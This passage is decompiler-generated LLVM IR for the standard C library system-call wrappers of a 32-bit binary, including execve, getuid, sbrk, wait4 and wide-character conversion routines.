  ret i32 %v0_805169e

; uselistorder directives
  uselistorder i32 %v7_8051685, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805169d, { 1, 0 }
}

define i32 @__GI_clock_getres(i32 %arg1, %timespec* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80516a4 = load i32, i32* @ebx, align 4
  store i32 %v0_80516a4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v4_80516b7 = call i32 @clock_getres(i32 %arg1, %timespec* %arg2)
  store i32 %v4_80516b7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80516b7, -4095
  br i1 %tmp, label %dec_label_pc_80516d0, label %dec_label_pc_80516c4

dec_label_pc_80516c4:                             ; preds = %entry
  %v0_80516c4 = load i32, i32* %stack_var_-4, align 4
  %v1_80516c4 = call i32 @__errno_location(i32 %v0_80516c4)
  %v0_80516c9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80516c9 = sub i32 0, %v0_80516c9
  %v2_80516cb = inttoptr i32 %v1_80516c4 to i32*
  store i32 %v1_80516c9, i32* %v2_80516cb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80516d0

dec_label_pc_80516d0:                             ; preds = %entry, %dec_label_pc_80516c4
  %v0_80516d1 = phi i32 [ %v4_80516b7, %entry ], [ -1, %dec_label_pc_80516c4 ]
  %v2_80516d0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80516d0, i32* @edx, align 4
  %v2_80516d4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80516d4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80516d1

; uselistorder directives
  uselistorder i32 %v4_80516b7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80516d0, { 1, 0 }
}

define i32 @__GI_execve(i8* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i8* @__decompiler_undefined_function_1()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-4 = alloca i32, align 4
  %v0_80516d8 = load i32, i32* @edi, align 4
  store i32 %v0_80516d8, i32* %stack_var_-4, align 4
  %v4_80516dc = ptrtoint i8* %arg1 to i32
  store i32 %v4_80516dc, i32* %edi.global-to-local, align 4
  %v0_80516e8 = load i32, i32* @ebx, align 4
  %v5_80516f0 = insertvalue [1 x i8*] undef, i8* %tmp5, 0
  %v8_80516f0 = insertvalue [1 x i8*] undef, i8* %tmp, 0
  %v9_80516f0 = call i32 @execve(i8* %arg1, [1 x i8*] %v5_80516f0, [1 x i8*] %v8_80516f0)
  store i32 %v9_80516f0, i32* %edi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v9_80516f0, -4095
  br i1 %tmp12, label %dec_label_pc_8051708, label %dec_label_pc_80516fc

dec_label_pc_80516fc:                             ; preds = %entry
  %v1_80516fc = call i32 @__errno_location(i32 %v0_80516e8)
  %v0_8051701 = load i32, i32* %edi.global-to-local, align 4
  %v1_8051701 = sub i32 0, %v0_8051701
  %v2_8051703 = inttoptr i32 %v1_80516fc to i32*
  store i32 %v1_8051701, i32* %v2_8051703, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051708

dec_label_pc_8051708:                             ; preds = %entry, %dec_label_pc_80516fc
  %v0_8051709 = phi i32 [ %v9_80516f0, %entry ], [ -1, %dec_label_pc_80516fc ]
  %v2_805170c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805170c, i32* %edi.global-to-local, align 4
  ret i32 %v0_8051709

; uselistorder directives
  uselistorder i32 %v9_80516f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051708, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051710 = load i32, i32* @ebx, align 4
  store i32 %v0_8051710, i32* %stack_var_-4, align 4
  %v1_8051719 = call i32 @int80_syscall(i32 202)
  store i32 %v1_8051719, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051719, -4095
  br i1 %tmp, label %dec_label_pc_8051730, label %dec_label_pc_8051724

dec_label_pc_8051724:                             ; preds = %entry
  %v0_8051724 = load i32, i32* %stack_var_-4, align 4
  %v1_8051724 = call i32 @__errno_location(i32 %v0_8051724)
  %v0_8051729 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051729 = sub i32 0, %v0_8051729
  %v2_805172b = inttoptr i32 %v1_8051724 to i32*
  store i32 %v1_8051729, i32* %v2_805172b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051730

dec_label_pc_8051730:                             ; preds = %entry, %dec_label_pc_8051724
  %v0_8051731 = phi i32 [ %v1_8051719, %entry ], [ -1, %dec_label_pc_8051724 ]
  %v2_8051734 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051734, i32* @ebx, align 4
  ret i32 %v0_8051731

; uselistorder directives
  uselistorder i32 %v1_8051719, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051730, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051738 = load i32, i32* @ebx, align 4
  store i32 %v0_8051738, i32* %stack_var_-4, align 4
  %v1_8051741 = call i32 @int80_syscall(i32 201)
  store i32 %v1_8051741, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051741, -4095
  br i1 %tmp, label %dec_label_pc_8051758, label %dec_label_pc_805174c

dec_label_pc_805174c:                             ; preds = %entry
  %v0_805174c = load i32, i32* %stack_var_-4, align 4
  %v1_805174c = call i32 @__errno_location(i32 %v0_805174c)
  %v0_8051751 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051751 = sub i32 0, %v0_8051751
  %v2_8051753 = inttoptr i32 %v1_805174c to i32*
  store i32 %v1_8051751, i32* %v2_8051753, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051758

dec_label_pc_8051758:                             ; preds = %entry, %dec_label_pc_805174c
  %v0_8051759 = phi i32 [ %v1_8051741, %entry ], [ -1, %dec_label_pc_805174c ]
  %v2_805175c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805175c, i32* @ebx, align 4
  ret i32 %v0_8051759

; uselistorder directives
  uselistorder i32 %v1_8051741, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051758, { 1, 0 }
}

define i32 @getgid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051760 = load i32, i32* @ebx, align 4
  store i32 %v0_8051760, i32* %stack_var_-4, align 4
  %v1_8051769 = call i32 @int80_syscall(i32 200)
  store i32 %v1_8051769, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8051769, -4095
  br i1 %tmp, label %dec_label_pc_8051780, label %dec_label_pc_8051774

dec_label_pc_8051774:                             ; preds = %entry
  %v0_8051774 = load i32, i32* %stack_var_-4, align 4
  %v1_8051774 = call i32 @__errno_location(i32 %v0_8051774)
  %v0_8051779 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051779 = sub i32 0, %v0_8051779
  %v2_805177b = inttoptr i32 %v1_8051774 to i32*
  store i32 %v1_8051779, i32* %v2_805177b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051780

dec_label_pc_8051780:                             ; preds = %entry, %dec_label_pc_8051774
  %v0_8051781 = phi i32 [ %v1_8051769, %entry ], [ -1, %dec_label_pc_8051774 ]
  %v2_8051784 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051784, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051781

; uselistorder directives
  uselistorder i32 %v1_8051769, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051780, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v0_8051788 = load i32, i32* @global_var_805b964.157, align 4
  store i32 %v0_8051788, i32* @edx, align 4
  %v1_8051793 = icmp eq i32 %v0_8051788, 0
  %v1_8051795 = icmp eq i1 %v1_8051793, false
  %v4_8051795 = select i1 %v1_8051795, i32 %v0_8051788, i32 4096
  ret i32 %v4_8051795
}

define i32 @getuid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805179c = load i32, i32* @ebx, align 4
  store i32 %v0_805179c, i32* %stack_var_-4, align 4
  %v1_80517a5 = call i32 @int80_syscall(i32 199)
  store i32 %v1_80517a5, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80517a5, -4095
  br i1 %tmp, label %dec_label_pc_80517bc, label %dec_label_pc_80517b0

dec_label_pc_80517b0:                             ; preds = %entry
  %v0_80517b0 = load i32, i32* %stack_var_-4, align 4
  %v1_80517b0 = call i32 @__errno_location(i32 %v0_80517b0)
  %v0_80517b5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80517b5 = sub i32 0, %v0_80517b5
  %v2_80517b7 = inttoptr i32 %v1_80517b0 to i32*
  store i32 %v1_80517b5, i32* %v2_80517b7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80517bc

dec_label_pc_80517bc:                             ; preds = %entry, %dec_label_pc_80517b0
  %v0_80517bd = phi i32 [ %v1_80517a5, %entry ], [ -1, %dec_label_pc_80517b0 ]
  %v2_80517c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80517c0, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80517bd

; uselistorder directives
  uselistorder i32 %v1_80517a5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80517bc, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80517c4 = load i32, i32* @ebx, align 4
  store i32 %v0_80517c4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_80517d7 = call i32 @munmap(i32 %v0_80517c4, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_80517d7, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v4_80517d7, -4095
  br i1 %tmp, label %dec_label_pc_80517f0, label %dec_label_pc_80517e4

dec_label_pc_80517e4:                             ; preds = %entry
  %v0_80517e4 = load i32, i32* %stack_var_-4, align 4
  %v1_80517e4 = call i32 @__errno_location(i32 %v0_80517e4)
  %v0_80517e9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80517e9 = sub i32 0, %v0_80517e9
  %v2_80517eb = inttoptr i32 %v1_80517e4 to i32*
  store i32 %v1_80517e9, i32* %v2_80517eb, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80517f0

dec_label_pc_80517f0:                             ; preds = %entry, %dec_label_pc_80517e4
  %v0_80517f1 = phi i32 [ %v4_80517d7, %entry ], [ -1, %dec_label_pc_80517e4 ]
  %v2_80517f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80517f0, i32* @edx, align 4
  %v2_80517f4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80517f4, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80517f1

; uselistorder directives
  uselistorder i32 %v4_80517d7, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80517f0, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_80517f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80517f8, i32* %stack_var_-4, align 4
  %v4_80517fc = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_80517fc, i32* %ebx.global-to-local, align 4
  %v6_805180b = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp5)
  store i32 %v6_805180b, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v6_805180b, -4095
  br i1 %tmp, label %dec_label_pc_8051824, label %dec_label_pc_8051818

dec_label_pc_8051818:                             ; preds = %entry
  %v0_8051818 = load i32, i32* %stack_var_-4, align 4
  %v1_8051818 = call i32 @__errno_location(i32 %v0_8051818)
  %v0_805181d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805181d = sub i32 0, %v0_805181d
  %v2_805181f = inttoptr i32 %v1_8051818 to i32*
  store i32 %v1_805181d, i32* %v2_805181f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051824

dec_label_pc_8051824:                             ; preds = %entry, %dec_label_pc_8051818
  %v0_8051825 = phi i32 [ %v6_805180b, %entry ], [ -1, %dec_label_pc_8051818 ]
  %v2_8051828 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051828, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051825

; uselistorder directives
  uselistorder i32 %v6_805180b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051824, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_805182d = load i32, i32* @ebx, align 4
  %v0_8051831 = load i32, i32* @global_var_805b97c.163, align 4
  %v1_8051831 = icmp eq i32 %v0_8051831, 0
  %v1_805183c = icmp eq i1 %v1_8051831, false
  br i1 %v1_805183c, label %dec_label_pc_805184f, label %dec_label_pc_805183e

dec_label_pc_805183e:                             ; preds = %entry
  %v1_8051843 = call i32 @__GI_brk(i32 0)
  %v2_805184b = icmp slt i32 %v1_8051843, 0
  br i1 %v2_805184b, label %dec_label_pc_8051871, label %dec_label_pc_805183e.dec_label_pc_805184f_crit_edge

dec_label_pc_805183e.dec_label_pc_805184f_crit_edge: ; preds = %dec_label_pc_805183e
  %v0_8051851.pre = load i32, i32* @global_var_805b97c.163, align 4
  br label %dec_label_pc_805184f

dec_label_pc_805184f:                             ; preds = %dec_label_pc_805183e.dec_label_pc_805184f_crit_edge, %entry
  %v0_805185f = phi i32 [ %v0_8051851.pre, %dec_label_pc_805183e.dec_label_pc_805184f_crit_edge ], [ %v0_8051831, %entry ]
  %v1_805184f = icmp eq i32 %arg1, 0
  %v1_8051856 = icmp eq i1 %v1_805184f, false
  br i1 %v1_8051856, label %dec_label_pc_805185c, label %dec_label_pc_8051858

dec_label_pc_8051858:                             ; preds = %dec_label_pc_805184f
  br label %dec_label_pc_8051874

dec_label_pc_805185c:                             ; preds = %dec_label_pc_805184f
  store i32 %v0_805185f, i32* @ebx, align 4
  %v2_8051861 = add i32 %v0_805185f, %arg1
  %v1_8051865 = call i32 @__GI_brk(i32 %v2_8051861)
  %v2_805186d = icmp slt i32 %v1_8051865, 0
  %v1_805186f = icmp eq i1 %v2_805186d, false
  br i1 %v1_805186f, label %dec_label_pc_805185c.dec_label_pc_8051874_crit_edge, label %dec_label_pc_8051871

dec_label_pc_805185c.dec_label_pc_8051874_crit_edge: ; preds = %dec_label_pc_805185c
  %v0_8051875.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051874

dec_label_pc_8051871:                             ; preds = %dec_label_pc_805185c, %dec_label_pc_805183e
  br label %dec_label_pc_8051874

dec_label_pc_8051874:                             ; preds = %dec_label_pc_805185c.dec_label_pc_8051874_crit_edge, %dec_label_pc_8051858, %dec_label_pc_8051871
  %v0_8051875 = phi i32 [ %v0_8051875.pre, %dec_label_pc_805185c.dec_label_pc_8051874_crit_edge ], [ %v0_805185f, %dec_label_pc_8051858 ], [ -1, %dec_label_pc_8051871 ]
  %v2_8051874 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051874, i32* @edx, align 4
  store i32 %v0_805182d, i32* @ebx, align 4
  ret i32 %v0_8051875

; uselistorder directives
  uselistorder i32 %v0_805185f, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8051874, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_805187c = load i32, i32* @edi, align 4
  %v0_805187d = load i32, i32* @esi, align 4
  store i32 %v0_805187d, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8051891 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8051899 = call i32 @wait4(i32 %v0_8051891, i32 %v0_805187d, i32 %v0_805187c, i32 %tmp5)
  store i32 %v0_8051891, i32* @ebx, align 4
  store i32 %v4_8051899, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_8051899, -4095
  br i1 %tmp, label %dec_label_pc_80518b1, label %dec_label_pc_80518a5

dec_label_pc_80518a5:                             ; preds = %entry
  %v1_80518a5 = call i32 @__errno_location(i32 %v0_8051891)
  %v0_80518aa = load i32, i32* %esi.global-to-local, align 4
  %v1_80518aa = sub i32 0, %v0_80518aa
  %v2_80518ac = inttoptr i32 %v1_80518a5 to i32*
  store i32 %v1_80518aa, i32* %v2_80518ac, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80518b1

dec_label_pc_80518b1:                             ; preds = %entry, %dec_label_pc_80518a5
  %v0_80518b2 = phi i32 [ %v4_8051899, %entry ], [ -1, %dec_label_pc_80518a5 ]
  %v2_80518b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80518b4, i32* @esi, align 4
  store i32 %v0_805187c, i32* @edi, align 4
  ret i32 %v0_80518b2

; uselistorder directives
  uselistorder i32 %v4_8051899, { 1, 0, 2 }
  uselistorder i32 %v0_8051891, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_80518b1, { 1, 0 }
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_80518c3 = icmp eq i32 %tmp4, 0
  %v1_80518c5 = icmp eq i1 %v1_80518c3, false
  br i1 %v1_80518c5, label %dec_label_pc_80518cd, label %dec_label_pc_80518c7

dec_label_pc_80518c7:                             ; preds = %entry
  %v2_80518c7 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_80518cd

dec_label_pc_80518cd:                             ; preds = %entry, %dec_label_pc_80518c7
  %v0_80518e9 = phi i32 [ %tmp4, %entry ], [ %v2_80518c7, %dec_label_pc_80518c7 ]
  %v0_80518d5 = phi i32 [ %tmp3, %entry ], [ 0, %dec_label_pc_80518c7 ]
  %v2_80518cd = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_80518cd, i32* %stack_var_-8, align 4
  store i32 %v0_80518d5, i32* %stack_var_-4, align 4
  %v2_80518e4 = ptrtoint i32* %stack_var_-8 to i32
  %v5_80518ea = inttoptr i32 %v0_80518e9 to i8*
  %v6_80518ea = call i32 @__GI_wcsnrtombs(i8* %v5_80518ea, i32 %v2_80518e4, i32 1, i32 16, i32 %tmp)
  %v1_80518f4 = icmp eq i32 %v6_80518ea, 0
  %v3_80518f6 = select i1 %v1_80518f4, i32 1, i32 %v6_80518ea
  ret i32 %v3_80518f6

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_80518cd, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8051915 = inttoptr i32 %tmp to i8*
  %v6_8051915 = call i32 @__GI_wcsnrtombs(i8* %v5_8051915, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8051915
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-32 = alloca i32, align 4
  %v0_8051923 = load i32, i32* @ebx, align 4
  %v4_8051927 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051927, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_8051937 = icmp eq i8* %arg1, null
  store i1 %v1_8051937, i1* %zf.global-to-local, align 1
  br i1 %v1_8051937, label %dec_label_pc_8051946, label %dec_label_pc_805193b

dec_label_pc_805193b:                             ; preds = %entry
  %v12_805193b = icmp eq i32 %v4_8051927, %arg2
  store i1 %v12_805193b, i1* %zf.global-to-local, align 1
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8051942 = icmp eq i1 %v12_805193b, false
  br i1 %v1_8051942, label %dec_label_pc_8051969, label %dec_label_pc_8051963

dec_label_pc_8051946:                             ; preds = %entry
  %v2_8051946 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051946, i32* %edx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8051967

dec_label_pc_805194f:                             ; preds = %dec_label_pc_8051977
  %v1_805194f = call i32 @__errno_location(i32 %v0_8051923)
  %v1_8051954 = inttoptr i32 %v1_805194f to i32*
  store i32 84, i32* %v1_8051954, align 4
  br label %dec_label_pc_805199d

dec_label_pc_805195f:                             ; preds = %dec_label_pc_805197e
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %ebx.global-to-local, align 4
  %v0_8051992.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805198e

dec_label_pc_8051963:                             ; preds = %dec_label_pc_805193b
  %v2_8051963 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051963, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051967

dec_label_pc_8051967:                             ; preds = %dec_label_pc_8051946, %dec_label_pc_8051963
  %v2_805198016 = phi i32 [ %v2_8051946, %dec_label_pc_8051946 ], [ %v2_8051963, %dec_label_pc_8051963 ]
  %v1_805196c12 = phi i32 [ -1, %dec_label_pc_8051946 ], [ %arg4, %dec_label_pc_8051963 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051969

dec_label_pc_8051969:                             ; preds = %dec_label_pc_805193b, %dec_label_pc_8051967
  %v2_805198015 = phi i32 [ %v4_8051927, %dec_label_pc_805193b ], [ %v2_805198016, %dec_label_pc_8051967 ]
  %v0_805196e = phi i32 [ %arg4, %dec_label_pc_805193b ], [ %v1_805196c12, %dec_label_pc_8051967 ]
  %v1_8051969 = inttoptr i32 %arg2 to i32*
  %v2_8051969 = load i32, i32* %v1_8051969, align 4
  store i32 %v2_8051969, i32* %ebx.global-to-local, align 4
  %tmp31 = icmp uge i32 %v0_805196e, %arg3
  %v5_8051970 = select i1 %tmp31, i32 %arg3, i32 %v0_805196e
  store i32 %v5_8051970, i32* %edi.global-to-local, align 4
  store i32 %v5_8051970, i32* @ecx, align 4
  %v1_805198a3 = icmp eq i32 %v5_8051970, 0
  store i1 %v1_805198a3, i1* %zf.global-to-local, align 1
  %v1_805198c10 = icmp eq i1 %v1_805198a3, false
  br i1 %v1_805198c10, label %dec_label_pc_8051977, label %dec_label_pc_805198e

dec_label_pc_8051977:                             ; preds = %dec_label_pc_8051969, %dec_label_pc_8051984
  %v2_8051980 = phi i32 [ %v2_8051987, %dec_label_pc_8051984 ], [ %v2_805198015, %dec_label_pc_8051969 ]
  %v0_8051977 = phi i32 [ %v1_8051984, %dec_label_pc_8051984 ], [ %v2_8051969, %dec_label_pc_8051969 ]
  %v1_8051977 = inttoptr i32 %v0_8051977 to i32*
  %v2_8051977 = load i32, i32* %v1_8051977, align 4
  %v9_8051979 = icmp eq i32 %v2_8051977, 127
  store i1 %v9_8051979, i1* %zf.global-to-local, align 1
  %v6_805197c = icmp ugt i32 %v2_8051977, 127
  br i1 %v6_805197c, label %dec_label_pc_805194f, label %dec_label_pc_805197e

dec_label_pc_805197e:                             ; preds = %dec_label_pc_8051977
  %v3_805197e = trunc i32 %v2_8051977 to i8
  %v4_805197e = icmp eq i8 %v3_805197e, 0
  store i1 %v4_805197e, i1* %zf.global-to-local, align 1
  %v3_8051980 = inttoptr i32 %v2_8051980 to i8*
  store i8 %v3_805197e, i8* %v3_8051980, align 1
  %v0_8051982 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8051982, label %dec_label_pc_805195f, label %dec_label_pc_8051984

dec_label_pc_8051984:                             ; preds = %dec_label_pc_805197e
  %v0_8051984 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051984 = add i32 %v0_8051984, 4
  store i32 %v1_8051984, i32* %ebx.global-to-local, align 4
  %v0_8051987 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051987 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051987 = add i32 %v1_8051987, %v0_8051987
  store i32 %v2_8051987, i32* %edx.global-to-local, align 4
  %v0_8051989 = load i32, i32* @ecx, align 4
  %v1_8051989 = add i32 %v0_8051989, -1
  %v8_8051989 = icmp eq i32 %v1_8051989, 0
  store i32 %v1_8051989, i32* @ecx, align 4
  store i1 %v8_8051989, i1* %zf.global-to-local, align 1
  %v1_805198c = icmp eq i1 %v8_8051989, false
  br i1 %v1_805198c, label %dec_label_pc_8051977, label %dec_label_pc_805198e

dec_label_pc_805198e:                             ; preds = %dec_label_pc_8051984, %dec_label_pc_8051969, %dec_label_pc_805195f
  %v0_8051996 = phi i32 [ 0, %dec_label_pc_805195f ], [ %v2_8051969, %dec_label_pc_8051969 ], [ %v1_8051984, %dec_label_pc_8051984 ]
  %v0_8051992 = phi i32 [ %v0_8051992.pre, %dec_label_pc_805195f ], [ %v2_805198015, %dec_label_pc_8051969 ], [ %v2_8051987, %dec_label_pc_8051984 ]
  %v2_805198e = ptrtoint i32* %stack_var_-32 to i32
  %v12_8051992 = icmp eq i32 %v0_8051992, %v2_805198e
  store i1 %v12_8051992, i1* %zf.global-to-local, align 1
  br i1 %v12_8051992, label %dec_label_pc_8051999, label %dec_label_pc_8051996

dec_label_pc_8051996:                             ; preds = %dec_label_pc_805198e
  %v1_8051996 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051996 = inttoptr i32 %v1_8051996 to i32*
  store i32 %v0_8051996, i32* %v2_8051996, align 4
  br label %dec_label_pc_8051999

dec_label_pc_8051999:                             ; preds = %dec_label_pc_805198e, %dec_label_pc_8051996
  %v0_8051999 = load i32, i32* %edi.global-to-local, align 4
  %v1_805199b = load i32, i32* @ecx, align 4
  %v2_805199b = sub i32 %v0_8051999, %v1_805199b
  %v12_805199b = icmp eq i32 %v2_805199b, 0
  br label %dec_label_pc_805199d

dec_label_pc_805199d:                             ; preds = %dec_label_pc_805194f, %dec_label_pc_8051999
  %storemerge = phi i1 [ %v12_805199b, %dec_label_pc_8051999 ], [ false, %dec_label_pc_805194f ]
  %storemerge1 = phi i32 [ %v2_805199b, %dec_label_pc_8051999 ], [ -1, %dec_label_pc_805194f ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_805199d = load i32, i32* @esp, align 4
  %v9_805199d = icmp eq i32 %v0_805199d, -28
  store i1 %v9_805199d, i1* %zf.global-to-local, align 1
  store i32 %v0_8051923, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i1 %v12_8051992, { 1, 0 }
  uselistorder i32 %v2_8051987, { 0, 2, 1 }
  uselistorder i32 %v1_8051984, { 0, 2, 1 }
  uselistorder i32 %v2_8051977, { 1, 2, 0 }
  uselistorder i32 %v2_8051969, { 1, 0, 2 }
  uselistorder i32 %v0_805196e, { 1, 0 }
  uselistorder i32 %v2_805198015, { 1, 0 }
  uselistorder i1 %v12_805193b, { 1, 0 }
  uselistorder i32 %v4_8051927, { 1, 0, 2 }
